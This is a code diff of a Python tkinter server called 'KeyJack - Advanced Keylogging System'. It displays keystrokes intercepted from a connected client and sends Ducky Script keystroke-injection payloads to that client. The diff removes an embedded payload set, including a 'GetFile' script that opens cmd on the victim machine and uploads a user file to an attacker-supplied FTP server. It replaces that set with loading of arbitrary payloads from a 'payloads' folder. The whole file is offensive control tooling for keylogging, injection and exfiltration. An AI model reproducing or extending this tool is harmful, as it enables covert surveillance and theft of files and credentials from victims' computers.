@@ -3,259 +3,178 @@ import threading
 import tkinter as tk
 from tkinter import filedialog, font, messagebox, ttk
 import os
-IP ='127.0.0.1'
-PORT = 10319 
+import shutil
+
+IP = '172.20.10.5'
+PORT = 10319
 
 class KeyJackServer:
     def __init__(self):
-        self.file_repository = {
-            "HelloWorld.txt": {
-                "content": """
-STRING Hello, World!
-ENTER
-DELAY 1000
-STRING This is a Ducky Script test.
-ENTER
-""",
-                "description": "Ducky Script that prints 'Hello, World!' and a test message"
-            },
-            "OpenCmd.txt": {
-                "content": """
-REM This is a basic Ducky Script example
-DELAY 1000
-GUI r
-DELAY 200
-STRING cmd
-DELAY 200
-ENTER
-DELAY 500
-STRING echo Hello from Ducky Script!
-ENTER
-DELAY 200
-STRING ipconfig
-ENTER
-DELAY 1000
-STRING exit
-ENTER
-""",
-                "description": "Ducky Script that opens cmd, prints a message, runs ipconfig, and exits"
-            },
-            "OpenNotepad.txt": {
-                "content": """
-DELAY 500
-GUI r
-DELAY 500
-STRING notepad.exe
-ENTER
-""",
-                "description": "Ducky Script that opens Notepad"
-            },
-            "OpenCalculator.txt": {
-                "content": """
-DELAY 500
-GUI r
-DELAY 500
-STRING calc.exe
-ENTER
-""",
-                "description": "Ducky Script that opens Calculator"
-            },
-            "GetFile":{
-                "content":"""
-GUI r
-DELAY 200
-STRING cmd
-ENTER
-DELAY 600
-STRING cd %USERPROFILE%
-ENTER
-STRING ftp -i SERVER
-ENTER
-DELAY 800
-STRING user
-ENTER
-DELAY 200
-STRING password
-ENTER
-DELAY 200
-STRING PUT FILE_PATH
-ENTER
-DELAY 3000
-STRING quit
-ENTER
-DELAY 200
-ALT F4
-STRING N""",
-                "description": "Ducky Script that uploads file to ftp server"
-
-            }
-        }
+        self.file_list = []
         self.connected_client = None
         self.server_socket = None
+        self.attacks_dir = "payloads"
         self.setup_gui()
         self.setup_network()
         self.root.mainloop()
 
+    def on_select(self, event):
+        selected = event.widget.get()
+        full_path = self.get_full_path(selected)
+        print(f"Selected full path: {full_path}")
+        self.update_file_description(selected)
+
+    def get_full_path(self, selected_item):
+        relative_path = selected_item.strip()
+        return os.path.join(self.attacks_dir, relative_path)
+
     def setup_gui(self):
         self.root = tk.Tk()
-        self.root.title("Key Jack")
-        self.root.geometry("800x600")
-        self.root.configure(bg='#001933')  # Dark blue background
+        self.root.title("KeyJack - Advanced Keylogging System")
+        self.root.geometry("900x700")
+        self.root.configure(bg='#2E2E2E')
 
-        self.cyber_font = font.Font(family="Courier", size=12, weight="bold")
+        self.style = ttk.Style()
+        self.style.theme_use('clam')
+        self.style.configure('TNotebook', background='#2E2E2E')
+        self.style.configure('TNotebook.Tab', background='#3E3E3E', foreground='#FFFFFF', padding=[10, 5])
+        self.style.map('TNotebook.Tab', background=[('selected', '#4E4E4E')])
+
+        self.cyber_font = font.Font(family="Consolas", size=10)
+        self.title_font = font.Font(family="Consolas", size=20, weight="bold")
 
         self.create_widgets()
         self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
 
     def create_widgets(self):
-        # Title
-        title_label = tk.Label(self.root, text="< KEY JACK >", font=("Courier", 24, "bold"),
-                               bg='#001933', fg='#00FF00')
-        title_label.pack(pady=20)
+        self.notebook = ttk.Notebook(self.root)
+        self.notebook.pack(fill=tk.BOTH, expand=1)
 
-        # File repository
-        self.create_file_repository_widgets()
+        self.injection_frame = ttk.Frame(self.notebook, style='TFrame')
+        self.notebook.add(self.injection_frame, text="Injection")
+        self.setup_injection_tab()
 
-        # Text areas
-        text_frame = tk.Frame(self.root, bg='#001933')
-        text_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
+        self.keystrokes_frame = ttk.Frame(self.notebook, style='TFrame')
+        self.notebook.add(self.keystrokes_frame, text="Keystrokes")
+        self.setup_keystrokes_tab()
 
-        self.create_text_area(text_frame, "INTERCEPTED KEYSTROKES", 0)
-        self.create_text_area(text_frame, "COMMAND CENTER", 1)
+        self.status_frame = tk.Frame(self.root, bg='#2E2E2E')
+        self.status_frame.pack(fill=tk.X, pady=5)
 
-        # Save keystrokes button
-        self.save_button = tk.Button(self.root, text="SAVE KEYSTROKES", command=self.save_keystrokes,
-                                     bg='#00FF00', fg='#000000', font=self.cyber_font)
-        self.save_button.pack(pady=10)
-
-        # Execute button
-        self.execute_button = tk.Button(self.root, text="EXECUTE COMMAND", command=self.handle_sending,
-                                        bg='#00FF00', fg='#000000', font=self.cyber_font)
-        self.execute_button.pack(pady=10)
-
-        # Add custom file button
-        self.add_file_button = tk.Button(self.root, text="ADD CUSTOM FILE", command=self.add_custom_file,
-                                         bg='#00FF00', fg='#000000', font=self.cyber_font)
-        self.add_file_button.pack(pady=10)
-
-        # Status
-        self.status_label = tk.Label(self.root, text="STATUS: DISCONNECTED", bg='#001933', fg='#FF0000',
+        self.status_label = tk.Label(self.status_frame, text="STATUS: DISCONNECTED", bg='#2E2E2E', fg='#FF0000',
                                      font=self.cyber_font)
-        self.status_label.pack(pady=5)
+        self.status_label.pack(side=tk.LEFT, padx=10)
 
-        # System ready label
-        self.system_label = tk.Label(self.root, text="[ SYSTEM READY ]", bg='#001933', fg='#00FF00',
+        self.system_label = tk.Label(self.status_frame, text="[ SYSTEM READY ]", bg='#2E2E2E', fg='#00FF00',
                                      font=self.cyber_font)
-        self.system_label.pack(pady=5)
+        self.system_label.pack(side=tk.RIGHT, padx=10)
 
-    def create_file_repository_widgets(self):
-        # Frame for file repository
-        repo_frame = tk.Frame(self.root, bg='#001933')
-        repo_frame.pack(pady=10, padx=20, fill=tk.X)
+    def setup_injection_tab(self):
+        repo_frame = ttk.Frame(self.injection_frame)
+        repo_frame.pack(pady=10, padx=10, fill=tk.X)
 
-        # Combobox for file selection
-        self.file_combobox = ttk.Combobox(repo_frame, font=self.cyber_font, state="readonly")
-        self.file_combobox['values'] = list(self.file_repository.keys())
-        self.file_combobox.pack(side=tk.LEFT, fill=tk.X, expand=True)
-        self.file_combobox.bind("<<ComboboxSelected>>", self.update_file_description)
+        self.file_combobox = ttk.Combobox(repo_frame, width=50, state="readonly")
+        self.file_combobox.set("Select a file")
+        self.file_combobox.bind("<<ComboboxSelected>>", self.on_select)
+        self.file_combobox.pack(side=tk.LEFT, expand=True, fill=tk.X)
 
-        if self.file_repository:
-            self.file_combobox.set(list(self.file_repository.keys())[0])
+        self.refresh_button = ttk.Button(repo_frame, text="Refresh", command=self.load_file_list)
+        self.refresh_button.pack(side=tk.RIGHT, padx=5)
 
-        # File description
-        self.file_description = tk.Label(self.root, text="", bg='#001933', fg='#00FF00', font=self.cyber_font,
-                                         wraplength=780)
+        self.upload_button = ttk.Button(repo_frame, text="Upload File", command=self.upload_file)
+        self.upload_button.pack(side=tk.RIGHT, padx=5)
+
+        self.file_description = tk.Label(self.injection_frame, text="", bg='#2E2E2E', fg='#00FF00',
+                                         font=self.cyber_font, wraplength=850)
         self.file_description.pack(pady=5)
 
-        # Initialize description
-        self.update_file_description(None)
+        self.command_center_area = tk.Text(self.injection_frame, height=15, bg='#000000', fg='#00FF00',
+                                           font=self.cyber_font)
+        self.command_center_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
 
-    def create_text_area(self, parent, title, column):
-        frame = tk.Frame(parent, bg='#001933')
-        frame.grid(row=0, column=column, sticky="nsew", padx=10)
-        parent.grid_columnconfigure(column, weight=1)
+        self.execute_button = ttk.Button(self.injection_frame, text="EXECUTE INJECTION",
+                                         command=self.handle_sending)
+        self.execute_button.pack(pady=10)
 
-        label = tk.Label(frame, text=title, bg='#001933', fg='#00FF00', font=self.cyber_font)
-        label.pack()
+        self.load_file_list()
 
-        text_area = tk.Text(frame, height=15, width=40, bg='#000000', fg='#00FF00', font=self.cyber_font)
-        text_area.pack(fill=tk.BOTH, expand=True)
+    def setup_keystrokes_tab(self):
+        self.intercepted_keystrokes_area = tk.Text(self.keystrokes_frame, height=20, bg='#000000', fg='#00FF00',
+                                                   font=self.cyber_font)
+        self.intercepted_keystrokes_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
 
-        setattr(self, f"{title.lower().replace(' ', '_')}_area", text_area)
+        self.save_button = ttk.Button(self.keystrokes_frame, text="SAVE KEYSTROKES",
+                                      command=self.save_keystrokes)
+        self.save_button.pack(pady=10)
 
-    def update_file_description(self, event):
-        selected_file = self.file_combobox.get()
-        if selected_file in self.file_repository:
-            description = self.file_repository[selected_file]["description"]
-            self.file_description.config(text=f"File Description: {description}")
+    def load_file_list(self):
+        if not os.path.exists(self.attacks_dir):
+            os.makedirs(self.attacks_dir)
+
+        options = []
+        for root, dirs, files in os.walk(self.attacks_dir):
+            level = root.replace(self.attacks_dir, '').count(os.sep)
+            indent = ' ' * 4 * level
+            subdir = os.path.relpath(root, self.attacks_dir)
+            if subdir != '.':
+                options.append(f"{indent}{subdir}/")
+            for f in files:
+                options.append(f"{indent}{os.path.join(subdir, f)}")
+
+        self.file_combobox['values'] = options
+        if options:
+            self.file_combobox.set(options[0])
+            self.update_file_description(options[0])
+        else:
+            self.file_combobox.set('')
+            self.file_description.config(text="No files found in the attacks directory.")
+
+    def update_file_description(self, selected_file):
+        if selected_file:
+            file_path = self.get_full_path(selected_file)
+            if os.path.isfile(file_path):
+                try:
+                    with open(file_path, 'r') as file:
+                        content = file.read(100)  # Read first 100 characters
+                    self.file_description.config(text=f"File: {file_path}\nPreview: {content}...")
+                except Exception as e:
+                    self.file_description.config(text=f"Error reading file: {str(e)}")
+            else:
+                self.file_description.config(text=f"Selected directory: {file_path}")
+        else:
+            self.file_description.config(text="")
 
     def handle_sending(self):
         selected_file = self.file_combobox.get()
-        if selected_file in self.file_repository:
-            content = self.file_repository[selected_file]["content"]
-            if content:
-                if selected_file == 'GetFile':
-                    self.get_ftp_details_and_send(content)
-                else:
-                    self.send_message_to_client(selected_file, content)
+        if selected_file:
+            file_path = self.get_full_path(selected_file)
+            if os.path.isfile(file_path):
+                try:
+                    with open(file_path, 'r') as file:
+                        content = file.read()
+                    if content:
+                        self.send_message_to_client(selected_file, content)
+                    else:
+                        self.update_command_center("Error: File is empty.")
+                except FileNotFoundError:
+                    self.update_command_center(f"Error: File '{file_path}' not found.")
+                except Exception as e:
+                    self.update_command_center(f"Error reading file: {str(e)}")
             else:
-                self.update_command_center("Error: File content is empty.")
+                self.update_command_center("Selected item is a directory, not a file.")
         else:
-            self.update_command_center("No file selected from repository.")
+            self.update_command_center("No file selected from the list.")
 
-    def get_ftp_details_and_send(self, content):
-        def on_submit():
-            username = username_entry.get()
-            password = password_entry.get()
-            server = server_entry.get()
-            file_path = file_path_entry.get()
-
-            updated_content = content.replace("SERVER", server).replace("user", username).replace("password", password).replace("FILE_PATH", file_path)
-            print(updated_content)
-            self.send_message_to_client("GetFile", updated_content)
-            details_window.destroy()
-
-        details_window = tk.Toplevel(self.root)
-        details_window.title("Enter FTP Details")
-        details_window.geometry("400x250")
-        details_window.configure(bg='#001933')
-
-        tk.Label(details_window, text="FTP Server:", bg='#001933', fg='#00FF00', font=self.cyber_font).pack(pady=5)
-        server_entry = tk.Entry(details_window, font=self.cyber_font)
-        server_entry.pack(pady=5)
-
-        tk.Label(details_window, text="Username:", bg='#001933', fg='#00FF00', font=self.cyber_font).pack(pady=5)
-        username_entry = tk.Entry(details_window, font=self.cyber_font)
-        username_entry.pack(pady=5)
-
-        tk.Label(details_window, text="Password:", bg='#001933', fg='#00FF00', font=self.cyber_font).pack(pady=5)
-        password_entry = tk.Entry(details_window, font=self.cyber_font, show="*")
-        password_entry.pack(pady=5)
-
-        tk.Label(details_window, text="File Path:", bg='#001933', fg='#00FF00', font=self.cyber_font).pack(pady=5)
-        file_path_entry = tk.Entry(details_window, font=self.cyber_font)
-        file_path_entry.pack(pady=5)
-
-        submit_button = tk.Button(details_window, text="Submit", command=on_submit, bg='#00FF00', fg='#000000', font=self.cyber_font)
-        submit_button.pack(pady=10)
-
-
-    def add_custom_file(self):
+    def upload_file(self):
         file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
         if file_path:
-            with open(file_path, 'r') as file:
-                content = file.read()
             file_name = os.path.basename(file_path)
-            self.file_repository[file_name] = {
-                "content": content,
-                "description": f"Custom Ducky Script from {file_name}"
-            }
-            self.file_combobox['values'] = list(self.file_repository.keys())
-            self.file_combobox.set(file_name)
-            self.update_file_description(None)
-            messagebox.showinfo("Add Custom File", f"{file_name} added to repository.")
+            destination = os.path.join(self.attacks_dir, file_name)
+            shutil.copy2(file_path, destination)
+            self.load_file_list()
+            messagebox.showinfo("File Upload", f"{file_name} has been uploaded to the attacks directory.")
         else:
-            messagebox.showinfo("Add Custom File", "No file selected.")
+            messagebox.showinfo("File Upload", "No file selected.")
 
     def setup_network(self):
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -323,7 +242,6 @@ STRING N""",
         if self.server_socket:
             self.server_socket.close()
         self.root.destroy()
-
 
 if __name__ == "__main__":
     KeyJackServer()
